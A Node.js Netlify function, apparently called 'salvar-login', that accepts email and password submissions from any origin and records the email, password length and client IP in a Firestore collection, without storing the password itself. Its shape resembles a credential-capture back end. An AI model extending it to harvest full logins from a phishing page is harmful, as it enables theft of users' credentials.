const { initializeApp, cert, getApps } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

const headers = {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
};

function getDb() {
    if (!getApps().length) {
        const projectId = process.env.FIREBASE_PROJECT_ID;
        const clientEmail = process.env.FIREBASE_CLIENT_EMAIL;
        const privateKey = process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n');

        if (!projectId || !clientEmail || !privateKey) {
            throw new Error('Variaveis do Firebase nao configuradas no Netlify');
        }

        initializeApp({
            credential: cert({
                projectId,
                clientEmail,
                privateKey
            })
        });
    }

    return getFirestore();
}

exports.handler = async (event) => {
    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers, body: '' };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: 'Method Not Allowed' };
    }

    try {
        const body = JSON.parse(event.body || '{}');

        const email = body.email;
        const passwordProvided = Boolean(body.passwordProvided || body.password);
        const passwordLength = Number(body.passwordLength || String(body.password || '').length || 0);

        if (!email || !passwordProvided) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Dados invalidos' })
            };
        }

        const db = getDb();

        await db.collection('usuarios').add({
            email: email,
            passwordProvided: true,
            passwordLength: passwordLength,
            timestamp: new Date().toISOString(),
            ip: event.headers['x-forwarded-for'] || 'desconhecido'
        });

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ success: true })
        };

    } catch (error) {
        console.error('Erro na function salvar-login:', error);

        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({
                error: 'Erro interno',
                message: error.message
            })
        };
    }
};
